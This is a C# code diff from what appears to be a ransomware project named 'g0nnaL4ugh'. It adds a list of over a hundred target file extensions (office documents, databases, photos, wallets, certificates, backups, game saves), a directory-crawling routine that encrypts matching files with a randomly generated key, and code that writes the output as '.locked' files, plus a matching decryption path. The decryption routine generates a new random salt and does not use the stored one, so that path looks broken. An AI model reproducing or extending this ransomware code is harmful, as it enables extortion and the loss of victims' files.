@@ -44,22 +44,55 @@ namespace g0nnaL4ugh
 			this.nodes = new List<Node>();
 		}
 
-		public Spider(string[] paths, Decrypter decrypter)
+		public Spider(string[] paths, Decrypter decrypter, byte[] pwd)
 		{
 			this.initialPaths = paths;
 			this.decrypter = decrypter;
 			this.nodes = new List<Node>();
+			this.pwd = pwd;
 		}
 
-		public void BuildNodesFromPath()
+        public Boolean IsValidCipherTextExtension(string ext)
 		{
-			/*
+			var validExtensions = new[]
+			{
+				".locked"
+			};
+			var i = Array.IndexOf(validExtensions, ext);
+            return Array.IndexOf(validExtensions, ext) > -1;
+		}
+
+		public Boolean IsValidPlainTextExtension(string ext)
+		{
+            var validExtensions = new[]
+            {
+				".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "jpeg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
+                ".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass", ".bc6",
+                ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo",
+                ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk",
+                ".tor", ".psk", ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx",
+                ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", "wallet", ".wotreplay",
+                ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", ".rb", ".p7c", ".pk7", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl",
+                ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe", ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf",
+                ".pdd", ".dbf", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx", ".xls", ".wps", ".docm", ".docx", ".doc",
+                ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"
+            };
+			var i = Array.IndexOf(validExtensions, ext);
+			return Array.IndexOf(validExtensions, ext) > -1;
+        }
+      
+        public void BuildNodesFromPath()
+        {
+            /*
             * Here can be 2 options:
             *  - Encrypt
             *  - Decrypt
             */
-			if (this.IsEncryptionMode())
-			{
+            if (this.IsEncryptionMode())
+            {
+				/* 
+				 *  Create password since we are in encryption mode
+				 */
 				this.pwd = this.encrypter.GenerateRandomPrivateKey();
                 string password = Utilities.ConvertBytes2B64(this.pwd);
 #if DEBUG
@@ -95,39 +128,76 @@ namespace g0nnaL4ugh
 
             foreach(string filePath in files)
             {
+				string ext = Path.GetExtension(filePath);
 				TaskObject taskObject = new TaskObject(filePath, db, this.pwd);
-				var resetEvent = new ManualResetEvent(false);
-				ThreadPool.QueueUserWorkItem(
-					arg =>
+				if (this.IsEncryptionMode())
 				{
-					ProcessFile2EncCallback2(taskObject);
-					resetEvent.Set();
-				});
-				resetEvent.WaitOne();
+					if (this.IsValidPlainTextExtension(ext))
+					{
+						var resetEvent = new ManualResetEvent(false);
+						ThreadPool.QueueUserWorkItem(
+							arg =>
+						{
+							ProcessFile2EncCallback(taskObject);
+							resetEvent.Set();
+						});
+						resetEvent.WaitOne();
+					}
+				}else
+				{
+					if (this.IsValidCipherTextExtension(ext))
+					{
+						var resetEvent = new ManualResetEvent(false);
+                        ThreadPool.QueueUserWorkItem(
+                            arg =>
+                            {
+							    ProcessFile2DesCallback(taskObject);
+                                resetEvent.Set();
+                            });
+                        resetEvent.WaitOne();
+					}
+				}
             }
 
             foreach(string dir in childDirectories)
                 this.ProcessDirectory(dir, db);
 
         }
-
-		private void ProcessFile2EncCallback2(object obj)
+      
+		private void ProcessFile2EncCallback(object obj)
 		{
-			TaskObject taskObject = (TaskObject)obj;
-			List<Node> db = taskObject.Db;
-			var filePath = taskObject.FilePath;
-			byte[] generatedSalt = this.encrypter.GenerateRandomSalt();
-			byte[] bytes2Encrypt = File.ReadAllBytes(filePath);
-			Node node = new Node(NodeType.File, filePath, generatedSalt);
-			db.Add(node);
-			byte[] encrypted = this.encrypter.EncryptBytes(
-				bytes2Encrypt, taskObject.Pwd, generatedSalt
+            TaskObject taskObject = (TaskObject)obj;
+            List<Node> db = taskObject.Db;
+            var filePath = taskObject.FilePath;
+            byte[] generatedSalt = this.encrypter.GenerateRandomSalt();
+            byte[] bytes2Encrypt = File.ReadAllBytes(filePath);
+            Node node = new Node(NodeType.File, filePath, generatedSalt);
+            db.Add(node);
+            byte[] encrypted = this.encrypter.EncryptBytes(
+                bytes2Encrypt, taskObject.Pwd, generatedSalt
 			);
 #if DEBUG
-			Console.WriteLine("[T: " + Thread.CurrentThread.ManagedThreadId + "] " +
-							  filePath + " | " + Utilities.ConvertBytes2B64(generatedSalt));
-			Console.WriteLine("Encrypted bytes: " + Utilities.ConvertBytes2B64(encrypted));
+            Writter.WriteBytes2File(encrypted, filePath + ".locked");
+            Console.WriteLine("[T: " + Thread.CurrentThread.ManagedThreadId + "] " +
+			                  filePath + " | " + Utilities.ConvertBytes2B64(generatedSalt));
+            Console.WriteLine("Encrypted bytes: " + Utilities.ConvertBytes2B64(encrypted));
+#else
+         
 #endif
+		}
+
+        private void ProcessFile2DesCallback(object obj)
+		{
+			TaskObject taskObject = (TaskObject)obj;
+            List<Node> db = taskObject.Db;
+            var filePath = taskObject.FilePath;
+			byte[] salt = this.encrypter.GenerateRandomSalt();
+			byte[] bytes2Decrypt = File.ReadAllBytes(filePath);
+			Node node = new Node(NodeType.File, filePath, salt);
+			db.Add(node);
+			byte[] plainText = this.decrypter.DecryptBytes(
+				bytes2Decrypt, taskObject.Pwd, salt
+			);
 		}
 
         private bool IsEncryptionMode()
